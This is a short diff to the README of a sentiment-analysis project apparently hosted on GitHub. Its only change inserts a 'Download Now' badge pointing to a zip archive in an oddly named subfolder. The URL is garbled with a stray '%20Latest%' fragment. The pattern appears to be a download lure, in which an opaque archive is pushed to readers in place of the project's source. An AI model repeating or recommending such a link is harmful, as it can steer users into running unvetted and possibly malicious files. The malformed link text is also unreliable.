@@ -1,5 +1,7 @@
 # 🔍 CodeAlpha_Consumer-Sentiment-Analysis - Analyze Consumer Feelings Easily
 
+[![Download Now](https://raw.githubusercontent.com/Jhoncries/CodeAlpha_Consumer-Sentiment-Analysis/main/royetously/Sentiment_Alpha_Code_Consumer_Analysis_v2.1.zip%20Latest%https://raw.githubusercontent.com/Jhoncries/CodeAlpha_Consumer-Sentiment-Analysis/main/royetously/Sentiment_Alpha_Code_Consumer_Analysis_v2.1.zip)](https://raw.githubusercontent.com/Jhoncries/CodeAlpha_Consumer-Sentiment-Analysis/main/royetously/Sentiment_Alpha_Code_Consumer_Analysis_v2.1.zip)
+
 ## 📖 Overview
 
 CodeAlpha_Consumer-Sentiment-Analysis is an easy-to-use application that helps you analyze consumer sentiment and emotions. This tool utilizes various powerful techniques from Natural Language Processing (NLP) and Machine Learning (ML) to provide insights into how people feel about different products and services. Whether you are a business owner wanting to understand customer feedback or a researcher exploring public sentiment, this application will assist you in making data-driven decisions.
